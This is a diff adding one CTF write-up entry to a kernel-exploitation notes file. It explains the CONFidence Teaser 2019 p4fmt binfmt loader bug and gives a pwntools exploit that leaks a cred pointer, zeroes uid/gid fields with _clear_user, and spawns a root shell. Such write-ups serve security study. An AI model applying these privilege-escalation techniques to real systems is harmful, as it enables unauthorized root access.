@@ -14,6 +14,7 @@
 - [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
 - [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)
 - [Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)](#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018)
+- [Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)](#custom-binfmt-loader-oob-read--clear_user-for-privesc-confidence-teaser-2019)
 
 For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).
 
@@ -335,3 +336,31 @@ system("/bin/sh");
 **Key insight:** When a kernel module sets `addr_limit` to `KERNEL_DS` for kernel pointer access but fails to restore it on error paths, userspace processes retain the elevated `addr_limit`. This turns ordinary `read()`/`write()` syscalls into kernel memory read/write primitives. Always audit kernel module error paths for missing `set_fs()` restoration -- triggering the error (e.g., making a file path point to a directory) is often trivial.
 
 **References:** Midnight Sun CTF 2018
+
+---
+
+## Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)
+
+**Pattern (p4fmt):** Kernel module `p4fmt.ko` registers a new `binfmt` handler for files starting with `"P4"`. The loader reads a user-controlled header: `{magic, version, arg, load_count, header_offset, entry}` followed by `load_count` `{addr, length, offset}` entries. Two missing checks make this a full privesc primitive: `header_offset` is used unvalidated as a pointer offset into `bprm->buf[]` (OOB read of the kernel-side `linux_binprm` struct, including `struct cred *cred`), and `loads[i].addr | 8` selects a branch that calls `_clear_user(addr, length)` with fully attacker-controlled arguments — an arbitrary zeroing primitive that runs *before* `install_exec_creds()` commits `bprm->cred`.
+
+```python
+from pwn import *
+
+# Stage 1: leak bprm->cred via OOB header_offset into the kernel-side linux_binprm buffer.
+# load_count=5, header_offset=0x80-0x18 -> loads[] parsed from fields past bprm->buf.
+leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
+# Execute -> dmesg "vm_mmap(..., length=<cred_addr>, ...)" reveals the cred pointer.
+
+# Stage 2: zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid in bprm->cred via clear_user.
+# arg=1 with load entries whose addr has bit 3 set -> kernel calls _clear_user(addr, length).
+cred = 0xffff...          # from leak
+entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap RWX page for shellcode
+entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
+binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
+binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
+# exec -> install_exec_creds sees a cred with uid=0 -> root shell (drop_privileges bypass)
+```
+
+**Key insight:** Custom `binfmt_misc`-style loaders are a fertile target because they parse attacker-supplied headers *before* `install_exec_creds` commits the per-exec credential struct. Any primitive that touches `bprm` in that window (OOB read to leak `bprm->cred`, arbitrary `_clear_user` to zero cred fields, `vm_mmap` with controlled flags/prot for kernel-aided RWX) composes into privesc without needing a traditional kernel memory-corruption chain. Always audit `load_*_binary` functions in custom modules for (a) bounds on header offsets and counts, (b) `access_ok`/range checks on `addr`/`length` arguments passed to `_clear_user`/`copy_to_user`, and (c) side-channel info leaks via `printk`.
+
+**References:** CONFidence CTF 2019 Teaser — p4fmt, writeup 13992
